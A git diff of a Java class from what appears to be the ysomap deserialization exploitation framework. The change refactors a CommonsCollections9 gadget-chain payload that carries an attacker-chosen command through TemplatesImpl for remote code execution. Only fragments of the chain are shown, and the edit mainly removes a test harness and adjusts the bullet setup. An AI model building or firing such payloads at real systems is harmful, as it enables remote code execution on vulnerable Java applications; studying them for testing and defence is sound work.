@@ -4,10 +4,9 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
-import ysomap.exception.GenerateErrorException;
-import ysomap.runner.PayloadTester;
 import ysomap.annotation.Authors;
 import ysomap.annotation.Dependencies;
+import ysomap.annotation.Require;
 import ysomap.gadget.ObjectGadget;
 import ysomap.gadget.bullet.TemplatesImplBullet;
 import ysomap.gadget.payload.Payload;
@@ -27,6 +26,7 @@ import java.util.Map;
  */
 @SuppressWarnings({"rawtypes","unchecked"})
 @Dependencies({"commons-collections:commons-collections:3.2.1"})
+@Require(bullets = {"TemplatesImplBullet"})
 @Authors({ Authors.WH1T3P1G })
 public class CommonsCollections9 extends Payload<HashSet> {
 
@@ -90,14 +90,7 @@ public class CommonsCollections9 extends Payload<HashSet> {
     }
 
     @Override
-    public ObjectGadget getDefaultBullet(String command) {
-        return new TemplatesImplBullet(command);
-    }
-
-    public static void main(String[] args) throws GenerateErrorException {
-        ObjectGadget bullet = new TemplatesImplBullet(null);
-        new PayloadTester(CommonsCollections9.class)
-                .setBullet(bullet)
-                .run();
+    public ObjectGadget getDefaultBullet(String command) throws Exception {
+        return new TemplatesImplBullet().set("body", command);
     }
 }
